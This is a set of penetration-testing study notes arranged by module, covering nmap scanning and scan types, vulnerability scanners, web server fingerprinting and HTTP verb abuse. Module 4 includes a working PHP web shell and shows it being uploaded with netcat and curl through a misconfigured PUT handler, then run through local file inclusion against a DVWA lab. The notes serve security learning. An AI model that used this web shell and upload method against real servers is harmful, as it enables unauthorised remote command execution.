# Penetration Testing

## Module 1: Information Gatehering
Tools that can be used for information gathering includes:
- Crunchbase
- whois

## Module 2: Footprinting and Scanning
Footprinting:<br>
Collecting information regarding the network you are assessing
##### Ping Sweeping<br>
Finding which IP are active on a given network using ICMP (tool: ping)

There are 2 tools available for doing ping:
1. nmap<br>
  - using ICMP
  <br> ```nmap -sP 192.168.0-30```
  <br> or
  <br> ```nmap -iL list-of-ips.txt```
  <br> or (for all)
  <br> ```nmap -sP 192.168.0.*```
  <br> or (for a subnet)
  <br> ```nmap -sP 192.168.0/24```
  - using TCP for network with blocked ICMP
  <br> ```nmap -sP -PT80 192.168.0.1-30```
2. fping
  <br>```fping -f iplist```
3. ping
  <br> ```for i in {1..254}; do ping -c 1 192.168.0.$i | grep 'from'; done```

[nmap Cheatsheet](https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/)

##### [NMAP OS Fingerprinting](https://nmap.org/book/man-os-detection.html)
We can determine the OS running on a server using nmap (with TCP):
```
# -v is to verbose things up, not a must
nmap -O -v scanme.map.org # may require sudo
```

##### [Port Scanning Types](https://nmap.org/bennieston-tutorial/)
###### UDP Scan [-sU]
Scanning for open UDP ports is done with the -sU option. With this scan type, Nmap sends 0-byte UDP packets to each target port on the victim. Receipt of an ICMP Port Unreachable message signifies the port is closed, otherwise it is assumed open.

###### TCP Connect and TCP SYN [-sT and -sS]
<br>
We can scan for open ports using these several well-known scanning types:
- TCP connect <br>
attempts to establish connection using a full 3-way handshake
```
nmap -sT 192.168.1.1
```

- Half-open scanning / TCP SYN scan (default) <br>
attempts to establish connection using 3-way handshake's SYN only
```
nmap -sS 192.168.1.1
```
###### Version Detection [-sV]
Version Detection collects information about the specific service running on an open port, including the product name and version number

###### ACK Scan [-sA]
Usually used to map firewall rulesets and distinguish between stateful and stateless firewalls, this scan type sends ACK packets to a host. If an RST comes back, the port is classified "unfiltered" (that is, it was allowed to send its RST through whatever firewall was in place). If nothing comes back, the port is said to be "filtered". That is, the firewall prevented the RST coming back from the port. This scan type can help determine if a firewall is stateless (just blocks incoming SYN packets) or stateful (tracks connections and also blocks unsolicited ACK packets).

Note that an ACK scan will never show ports in the "open" state, and so it should be used in conjunction with another scan type to gain more information about firewalls or packet filters between yourself and the victim.



###### Alternative : FIN, Null, and Xmas Tree Scans [-sF, -sN, -sX]
With the multitude of modern firewalls and IDS’ now looking out for SYN scans, these three scan types may be useful to varying degrees.
Each scan type refers to the flags set in the TCP header. The idea behind these type of scans is that a closed port should respond with an RST upon receiving packets, whereas an open port should just drop them (it’s listening for packets with SYN set). This way, you never make even part of a connection, and never send a SYN packet; which is what most IDS’ look out for.

The FIN scan sends a packet with only the FIN flag set, the Xmas Tree scan sets the FIN, URG and PUSH flags (see a good TCP/IP book for more details) and the Null scan sends a packet with no flags switched on.

These scan types will work against any system where the TCP/IP implementation follows RFC 793. Microsoft Windows does not follow the RFC, and will ignore these packets even on closed ports. This technicality allows you to detect an MS Windows system by running SYN along with one of these scans. If the SYN scan shows open ports, and the FIN/NUL/XMAS does not, chances are you’re looking at a Windows box (though OS Fingerprinting is a much more reliable way of determining the OS running on a target!)

###### How NMAP -sT and -sS Works (a little)
The first system then sends an ACK packet to acknowledge receipt of the SYN/ACK, and data transfer can then begin.
SYN or Stealth scanning makes use of this procedure by sending a SYN packet and looking at the response.
If SYN/ACK is sent back, the port is open and the remote end is trying to open a TCP connection. The scanner then sends an RST to tear down the connection before it can be established fully; often preventing the connection attempt appearing in application logs.
If the port is closed, an RST will be sent.
If it is filtered, the SYN packet will have been dropped and no response will be sent. In this way, Nmap can detect three port states - open, closed and filtered.

## Module 3: Vulnerability Assessment
##### Vulnerability assessment
Vulnerability assessment can be done in 2 ways:
1. Checking manually
2. Using tools

Tools types:
1. Port scanner (i.e. nmap)
2. Network Vulnerability scanner (i.e. nessus)
3. Web application security scanner (i.e. nikto, qualys, burp suite, OWASP ZAP, edgescan)
4. Database security scanner
5. Host based security scanner (i.e. Lynis)
6. ERP security scanner
7. Single Vulnerability tests

##### Nessus


## Module 4: Web Attacks
We can determine what kind of web server (and other information) the server are running on.

##### [Web Fingerprinting](http://www.net-square.com/httprint_paper.html)

We usually fingerprint a web server in order to find out some information on the HTTP frame, which is called HTTP Banner.

You can do web fingerprinting using manual or automated means:
###### Manual fingerprinting
Below are example of fingerprinting using netcat:
```
root@waristea:~# nc 208.96.18.125 80
# Response
HEAD / HTTP/1.1
Host: 208.96.18.125

HTTP/1.1 200 OK
Date: Tue, 31 Jul 2018 03:03:03 GMT
Server: Apache
X-Powered-By: PHP/5.3.5 ZendServer/5.0
Set-Cookie: SESSIONID_VULN-SITE=shfjh3iuh35g2j5g32hjg5; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT # set to the past to prevent caching of response
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Connection: close
Content-Type: text/html
```
As we can see it runs on Apache, PHP 5.3.5.

You can also use telnet or nmap [-sV] to do the same thing.

Another method is to send a malformed request to the web server that will cause the web server to produce an error page which will contain in the response header the version of the web server.

Another method is to see the source code (ofc)

We also can view SSL certificate fingerprint using openssl:
```
openssl x509 -noout -fingerprint -sha256 -inform pem -in [certificate-file.crt]
```

###### Automatic fingerprinting
Sometime a webserver's information is obfuscated using some kind of software. You can mitigate this by using an automated tool.

We can use a tool called httpprint
```
root@waristea: ~# ./httpprint -h 87.230.29.167 -s signatures.txt
```

##### Obfuscation
As has been explained above, sometimes, a web server's information is obfuscated using some kind of software. You can mitigate this by using an automated tool.

But you can also determine a web server's type by examining its HTTP response, be it from the order of the field shown and the type of response you get on each HTTP Verb.

You can search online to find out what kind of server is run according to its characteristics.

##### [HTTP Verbs Exploitation](https://osandamalith.com/2015/06/14/exploiting-http-verbs/)
We can exploit misconfigured HTTP verbs:
###### Enumeration with OPTIONS
We can see what paths and methods are available on a given website.
```
% nc localhost 80
OPTIONS / HTTP/1.0

HTTP/1.1 200 OK
Allow: OPTIONS, TRACE, GET, HEAD, POST
Server: Microsoft-IIS/7.5
Public: OPTIONS, TRACE, GET, HEAD, POST
X-Powered-By: ASP.NET
Date: Sun, 14 Jun 2015 05:31:10 GMT
Connection: close
```
###### Exploiting DELETE
The DELETE verb is a dangerous verb and can be misused. If this is misconfigured, can be use to delete resources from the web server.
```
% nc localhost 80
DELETE  /location/resource HTTP/1.0

Date: Sun, 14 Jun 2015 05:01:22 GMT
Server: Apache/2.2.3 (CentOS)
X-Powered-By: PHP/5.1.6
Set-Cookie: PHPSESSID=ete39c4b0uk83phvucj1ftbsn5; expires=Mon, 15 Jun 2015 05:01:22 GMT; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Connection: close
Content-Type: text/html; charset=UTF-8
```

###### Exploiting PUT
This verb can be used to upload a resource into the server. This is also a risky verb if not configured applicably.
For example suppose we want to write `<?php echo ‘Hello World’; ?>` in a new file as `hello.php`.
Make sure you give the correct length of your payload.

```
%  cat -e hello.php
<?php echo 'Hello World'; ?>$

% wc -m hello.php
29 hello.php

% nc localhost 80
PUT /hello.php HTTP/1.0
Content-Type: text/html
Content-Length: 29

<?php echo 'Hello World'; ?>
```
###### Uploading a PHP Shell with PUT
Suppose we have a php server code as follows, which created whatever file in the HTTP PUT request:
```
<?php
    $putdata = fopen("php://input", "r");
    $fp = fopen("myfile", "w");
    while ($data = fread($putdata, 1024)) fwrite($fp, $data);
    fclose($fp);
    fclose($putdata);
?>
```
I will save this as “put.php” in my root directory of the web server.
Now we can request “put.php” using the PUT verb and send our payload.

```
% cat -e phpinfo.php
<?php phpinfo(); ?>$

% wc -m phpinfo.php
20 phpinfo.php

% nc 192.168.1.5 80
PUT /put.php HTTP/1.0
Content-Type: text/html
Content-Length: 20

<?php phpinfo(); ?>
HTTP/1.1 200 OK
Date: Mon, 15 Jun 2015 06:48:16 GMT
Server: Apache/2.4.7 (Win32) OpenSSL/0.9.8y PHP/5.4.22
X-Powered-By: PHP/5.4.22
Content-Length: 0
Connection: close
Content-Type: text/html
```

Now if you view “myfile” our payload should be nice written.

Suppose you have a local file inclusion situation, in cases like that we can include our newly written file using PUT
This is an example of local file inclusion. I’ll be using DVWA to demonstrate this.

```
<?php
    echo "File included: ".$_REQUEST["page"]."&lt;br&gt;";
    $file =  $_REQUEST["page"];
    include $file;
?>
```

Suppose we want to upload a simple web shell we can do it like the following
```
% wc -m shell.php
189 shell.php

% nc 192.168.1.5 80
PUT /put.php HTTP/1.0
Content-Type: text/html
Content-Length: 189

<?php

print '<form method="post">
Command: <input type="text" name="__"><br>
<input type="submit">
</form>';

if(isset($_POST["__"]))
	print '<pre>'.shell_exec($_POST["__"]).'</pre>';

?>
HTTP/1.1 200 OK
Date: Mon, 15 Jun 2015 07:39:42 GMT
Server: Apache/2.4.7 (Win32) OpenSSL/0.9.8y PHP/5.4.22
X-Powered-By: PHP/5.4.22
Content-Length: 0
Connection: close
Content-Type: text/html
```

After that include our “myfile” and you can execute commands on the server.

You can also use curl to upload a file using PUT easily.

```
% curl http://192.168.1.5/put.php --upload-file shell.php -v
* About to connect() to 192.168.1.5 port 80 (#0)
*   Trying 192.168.1.5...
* connected
* Connected to 192.168.1.5 (192.168.1.5) port 80 (#0)
> PUT /put.php HTTP/1.1
> User-Agent: curl/7.26.0
> Host: 192.168.1.5
> Accept: */*
> Content-Length: 189
> Expect: 100-continue
>
* additional stuff not fine transfer.c:1037: 0 0
* HTTP 1.1 or later with persistent connection, pipelining supported
< HTTP/1.1 100 Continue
* additional stuff not fine transfer.c:1037: 0 0
* We are completely uploaded and fine
* HTTP 1.1 or later with persistent connection, pipelining supported
< HTTP/1.1 200 OK
< Date: Mon, 15 Jun 2015 07:47:44 GMT
< Server: Apache/2.4.7 (Win32) OpenSSL/0.9.8y PHP/5.4.22
< X-Powered-By: PHP/5.4.22
< Content-Length: 0
< Content-Type: text/html
<
* Connection #0 to host 192.168.1.5 left intact
* Closing connection #0
```

##### Directories and File Enumeration


##### Google Hackings


##### Cross-Site Scripting


##### SQL Injections

## Module 5: System Attacks
##### Malware
- Viruses


- Trojan Horses


- Backdoors


- Rootkits


- Bootkits


- Adware


- Spyware


- Greyware


- Dialers


- Keyloggers


- Bots


- Ransomware


- Data-Stealing Malware


- Worms


##### Password Attacks
- Brute Force Attacks


- Dictionary Attacks


- John the Ripper



- Installing Password Dictionaries


- Rainbow Tables



##### Buffer Overflow Attacks

## Module 6: Network Attacks
##### Authentication Cracking


##### Windows Shares


##### Null Sessions


##### ARP Poisoning


##### Metasploit


##### Meterpreter
